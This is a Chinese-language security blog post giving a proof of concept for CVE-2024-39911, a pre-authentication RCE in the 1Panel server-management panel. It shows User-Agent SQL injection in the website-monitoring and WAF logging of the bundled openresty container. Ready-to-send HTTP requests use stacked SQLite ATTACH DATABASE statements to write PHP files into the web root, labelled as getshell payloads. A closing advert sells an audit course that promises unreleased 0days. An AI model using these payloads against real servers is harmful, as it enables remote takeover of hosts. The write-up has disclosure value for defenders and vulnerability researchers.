#  首发0day-1Panel面板最新前台RCE漏洞(内附Poc)   
 实战安全研究   2024-07-20 13:17  
  
**0x****00 漏****洞描述**  
  
    **1****Panel 是新一代的 Linux 服务器运维管理面板，用户可以通过 Web 图形界面轻松管理 Linux 服务器，实现主机监控、文件管理、数据库管理、容器管理等功能。且深度集成开源建站软件 WordPress 和 Halo.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9QzFXXGRSXCTP4WgzGnFakibdWqM1YAwxAMIBd6QOwGeOACzPbLIJF7hQ/640?wx_fmt=png&from=appmsg "")  
  
**0x********01 影响范围**  
  
**网站监控功能影响 == 1panel/openresty:1.21.4.3-3-1-focal**  
  
**WAF功能影响 <= 1panel/openresty:1.21.4.3-3-1-focal**  
  
**0x********02 网站监控漏洞点详细**  
  
**网站监控漏洞点利用条件:**  
```
专业版,并开启网站监控功能
关闭waf功能
安装有1P-openresty容器且搭建有php环境网站
```  
  
**这里会记录请求日志**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9Qc3n9bXqxAA2vzG3vsUZbzr53cAfvGuc85GSqw9PBZ9Hwwa4icK6Afwg/640?wx_fmt=png&from=appmsg "")  
  
**他记录的字段有 re ua头等**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9QvBxUEPWF3mxvbEFmVzMWXJJOZhzvicVVhYw2gPHxgmP76HbQ6P0vR3A/640?wx_fmt=png&from=appmsg "")  
  
**在记录的字段上加上单引号会发现没有成功记录日志，猜测这里存在一个inser的sql注入**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9QNPib7fK7icW5hPeeiaq605Fia0gKfz13nsLcgHeJZSZla60JV8cH6YMsbA/640?wx_fmt=png&from=appmsg "")  
  
**进一步验证因为数据库是sqlite,我们尝试一下字符串拼功能最后记录是啥样子的,发送数据包**  
```
User-Agent: Mozilla/5.0'||"blog.mo60.cn"||'b
```  
  
**发现字符串被拼接了，确定了这里存在一个insert的注入**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9QVD0mM4SPcsNhRUO5hrTpC4oZZx45PXfic0VCD7fIZvfiaiaqy03IevyAQ/640?wx_fmt=png&from=appmsg "")  
  
**这个功能的数据库在**  
```
/usr/local/openresty/1pwaf/data/db/sites/网站编号/site_req_logs.db
```  
  
**或者在宿主机的**  
```
/opt/1panel/apps/openresty/openresty/1pwaf/data/db/sites/网站代号
```  
  
**写入数据库语句的脚本在**  
```
/usr/local/openresty/1pwaf/lib/monitor_log.lua
```  
  
**执行的sql语句如下**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9QuibC95Ajny3uoqKA6tOaEMR09ABpESKYq6ShxhhHebWq2t6icMtVxHKg/640?wx_fmt=png&from=appmsg "")  
```
INSERT INTO site_req_logs (
            server_name, host,ip, ip_iso, ip_country_zh,
            ip_country_en, ip_province_zh, ip_province_en, 
            uri, user_agent, method, status_code, referer,
            spider, request_time, localtime, time, request_uri,
            flow, day, hour, uv_id, referer_domain,
            os,browser,device,pv_tag,uv_tag
        ) VALUES (
            '%s', '%s', '%s', '%s', '%s',
            '%s', '%s', '%s', 
            '%s', '%s', '%s', %d, '%s',
            '%s', %d, DATETIME('now'), %f, '%s',
            %d, '%s', '%s', '%s', '%s',
            '%s', '%s', '%s','%s','%s'
        )
```  
  
**我们可控的位置在user_agent头也就是**  
```
VALUES (
            '%s', '%s', '%s', '%s', '%s',
            '%s', '%s', '%s', 
            '可控点', '%s', '%s', %d, '%s',
            '%s', %d, DATETIME('now'), %f, '%s',
            %d, '%s', '%s', '%s', '%s',
            '%s', '%s', '%s','%s','%s'
        )
```  
  
**0x********03 网站监控点漏洞复现**  
  
**测试 Payload:**  
```
GET / HTTP/1.1
Host: 192.168.99.6
User-Agent: ua', 'blog.mo60.cn', 5201314, '', '', 1, '2024-06-09 08:16:52', 1817921010.847, '/AAAAAAA', 52014, '2025-06-09', '16', '', '', 'Linux', 'edge', 'pc', '', '');ATTACH DATABASE '/www/sites/index/index/mo60.cn.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('<?= md5("blog.mo60.cn"); ?>');#
```  
  
**发送后如果写入文件并输出C930b955726e241e6a7aa1e4184b54e7f就是存在**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9QugYBBqLwnAiapeFAJ2vsWFpKSluTOZxtiaa7XZVgSWJjMLI68DRQh6ibQ/640?wx_fmt=png&from=appmsg "")  
  
**那么我们的思路是通过堆叠注入写出文件,到网站目录下,因为网站大部分是支持php的**  
  
**Getshell Payload:**  
```
GET / HTTP/1.1
Host: 192.168.99.6
User-Agent: ua', 'blog.mo60.cn', 5201314, '', '', 1, '2024-06-09 08:16:52', 1817921010.847, '/AAAAAAA', 52014, '2025-06-09', '16', '', '', 'Linux', 'edge', 'pc', '', '');ATTACH DATABASE '/www/sites/index/index/mo60.cn.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('<?php phpinfo();?>');#
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9Qx0M3Q4zFIDKF8ny68vVZgKY2rzH7v1cVvflruj9cpFfcQwoG9D7sicQ/640?wx_fmt=png&from=appmsg "")  
  
**成功写入shell:**![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9QNwyrDUQ21aDg3MCFXmX4V31Liborh2FNIfVbXQl5ibhmlOoPujS73bFw/640?wx_fmt=png&from=appmsg "")  
  
  
**0x********04 WAF漏洞点详细**  
  
**WAF漏洞点利用条件:**  
```
开启waf功能
安装有1P-openresty容器且搭建有php环境网站
```  
  
**先来一条会触发waf的规则**  
  
****  
**可以看到在waf拦截记录里面记录了**  
```
http://URL/xpack/waf/websites
```  
  
********  
**可以看到记录的字段跟上面也差不多**  
  
**直接测试有没有注入**  
```
User-Agent: Mozilla/5.0'||"blog.mo60.cn"||'b
```  
  
**可以看到最近得到的是拼接后的结果，这里存在注入**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9QibwFWwA7NHdeThcorS4FKu0SupYztbsjgwH7colDqshbjSPibmj62tSQ/640?wx_fmt=png&from=appmsg "")  
  
**数据库的路径位于,是SQLite数据库**  
```
/usr/local/openresty/1pwaf/data/db/
```  
  
**里面有两个数据库文件,1pwaf.db 跟 req_log.db,一个是记录的waf的开关情况配置等，另外一个是我们需要的请求日志,我们的拦截日志就在这个库里面记录着**  
  
**可以看到我们的拦截记录就在这里面**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9QdwX8eibeZvEw2fBnQicbFmPoTAnugZerASyVoAdRicULP6hnGEnsCDvdA/640?wx_fmt=png&from=appmsg "")  
  
**打开可以看到执行的sql语句**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9Q2m0rlV1XPK9Vl4bB5FB97KTn3gPsp8sVWxxUwJFzzFPrIot0I2xS7Q/640?wx_fmt=png&from=appmsg "")  
```
INSERT INTO req_logs (
        id, ip, ip_iso, ip_country_zh, ip_country_en,
        ip_province_zh, ip_province_en, ip_longitude, ip_latitude, localtime, 
        time,server_name,  website_key, host, method,
        uri, user_agent, exec_rule, rule_type, match_rule, match_value,
        nginx_log, blocking_time, action, is_block, is_attack
    ) VALUES (
        '%s', '%s', '%s', '%s', '%s',
        '%s', '%s', %d, %d, DATETIME('now'),
         %f,  '%s', '%s', '%s', '%s',
         '%s', '%s', '%s', '%s', '%s', '%s', 
         '%s', %d, '%s', %d, %d
    )
```  
  
**我们的可控点在第二个插入参数的位置**  
```
VALUES (
        '%s', '%s', '%s', '%s', '%s',
        '%s', '%s', %d, %d, DATETIME('now'),
         %f,  '%s', '%s', '%s', '%s',
         '%s', '可控点', '%s', '%s', '%s', '%s', 
         '%s', %d, '%s', %d, %d
    )
```  
  
**0x********05 WAF点漏洞复现**  
  
**Getshell Payload:**  
```
GET /.git/config HTTP/1.1
Host: 192.168.99.6
User-Agent: blog.mo60.cn',"args", "sqlInjectA", "", "YmxvZy5tbzYwLmNu", "blog.mo60.cn", 0, "deny", 0, 1);ATTACH DATABASE '/www/sites/index/index/mo60.cn.php' AS test ;create TABLE test.exp (dataz text) ; insert INTO test.exp (dataz) VALUES ('<?= md5("blog.mo60.cn"); ?>');#
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9Q5CtLeLgamWb3iacW1Toy1D4yF1taNEIzmgdGPWjMMYRXcm8n2gAvicEg/640?wx_fmt=png&from=appmsg "")  
  
**访问成功执行**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9QKZxzfKXI3YE3oPBJB3Cww7AhSmfUeucicsVGyuHkrdroVtrMicxTBKRA/640?wx_fmt=png&from=appmsg "")  
  
**这里利用只要开启waf功能即可**  
  
**最后是CVE编号 CVE-2024-39911**  
  
**GitHubSecurity::****https://github.com/1Panel-dev/1Panel/security/advisories/GHSA-7m53-pwp6-v3f5**  
  
**注:上文已经过漏洞原作者授权所撰写**  
  
**0x06 代码审计课程宣传**  
  
**在文章末尾，我宣传一下我的代码审计课程，我是前零组攻防实验室的成员，每天跟进最新漏洞资讯，现阶段研究代码审计，一天审30套源码，每天都有出货，培训课程都是经过我细心录制的.**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9QDs2YNdjmkPuibvzuRFibpWEe0ibLTeLLSSGB7TWkLXsr4zyWDqggvSnkA/640?wx_fmt=png&from=appmsg "")  
  
**实战课程占课程总数的一半，一节课30分钟以上，里边还有两套未公布的0day，之后我录制任何课程及源码(包括Java)都无条件会发给前期报课的学员.**  
  
**源码及审计工具所占内存:**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9Q9xjSI8EiaQmrZprTsmMj0kl5cviavDpLHuDG3b0gKXSx8FKaCoOaCZKg/640?wx_fmt=png&from=appmsg "")  
  
**每个学员我都会一对一教导审计，所有源码及新审到的0day漏洞无条件分享，价格亲民(学生也有优惠)，有兴趣的同学+下方VX联系:**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9Qed9pYMib4R2RnzUyFjxXicoRXy4YYP0BTibbhCq8ToibuSrrSwicXvQx8Sg/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff43kUoicsmnll86ficaMcTp1nDJvFuhT6INWEyGaCkEEclfEo8Ld6OBOzzJ3BkTVbrfqd41XhAhicA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**原创CNVD证书及上千套源码**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ff43kUoicsmnll86ficaMcTpt1uZwVAmW8XEscyvU51uc9sdiaHViaJKMEZyiaM4bAaQfGIPNd26u2A5w/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5ezXLxiaaO0UEOyicc1eFgx9QtgWj5QmianwEb7ibibib5osqkvmudAqria50GDlTgJvuicfjLXbplVc6vBBg/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5dbasJicXJDEOR85icHkfIda3gg2HpaWjW2MZN9KZdGzX99Ofl7SRETFA4TicFabIO2UGibSONn6bhXQw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
# 免责声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!  
  
